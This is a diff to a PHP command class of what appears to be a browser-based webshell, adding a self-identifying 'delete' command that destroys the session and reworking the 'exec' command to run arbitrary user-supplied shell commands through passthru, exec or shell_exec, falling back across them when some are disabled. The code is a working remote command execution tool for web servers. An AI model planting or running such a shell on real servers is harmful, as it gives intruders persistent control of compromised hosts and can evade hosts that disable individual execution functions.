@@ -5,7 +5,26 @@ class Commands
 {
     protected function Cmd_clear()
     {
-        $_SESSION['webshell'] = [];
+        $_SESSION['webshell']['history'] = array();
+    }
+
+    protected function Cmd_delete()
+    {
+        $_SESSION = array();
+        if (isset($_COOKIE["PHPSESSID"])) {
+            setcookie("PHPSESSID", '', time() - 1800, '/');
+        }
+        session_destroy();
+        // echo __DIR__;
+        if(substr(__DIR__, 0, 7) === 'phar://') {
+            echo 'this Phar.';
+            // @todo realpathを通してもうまくパスが取得できない
+        }
+        else {
+            echo 'this shell.php';
+            echo realpath(__DIR__ . '/../');
+        }
+        exit();
     }
 
     protected function Cmd_cd($cmd)
@@ -67,8 +86,37 @@ class Commands
 
     protected function Cmd_exec($cmd)
     {
-        $exec_cmd = sprintf('cd %s ; %s', $_SESSION['webshell']['path'], $cmd);
-        $_resulet = mb_convert_encoding(shell_exec($exec_cmd), 'UTF-8');
+        $exec_cmd = sprintf('cd %s ; %s 2>&1', $_SESSION['webshell']['path'], $cmd);
+
+        if (strpos($cmd, '>') !== false) {
+            $exec_cmd = sprintf('cd %s ; %s', $_SESSION['webshell']['path'], $cmd);
+        }
+
+        $_executed = false;
+        if(function_exists('passthru') && ! $_executed) {
+            ob_start();
+            passthru($exec_cmd);
+            $_resulet = ob_get_contents();
+            ob_end_clean();
+            $_executed = true;
+        }
+
+        if(function_exists('exec') && ! $_executed) {
+            exec($exec_cmd, $_exec_result);
+            $_resulet = implode("\n", $_exec_result);
+            $_executed = true;
+        }
+
+        if(function_exists('shell_exec') && ! $_executed) {
+            $_resulet = shell_exec($exec_cmd);
+            $_executed = true;
+        }
+
+        if(! $_executed) {
+            return 'Error: Function undefined. (passthru, exec, shell_exec)' . PHP_EOL;
+        }
+
+        $_resulet = mb_convert_encoding($_resulet, 'UTF-8');
 
         return htmlspecialchars($_resulet, ENT_QUOTES, 'UTF-8', true);
     }
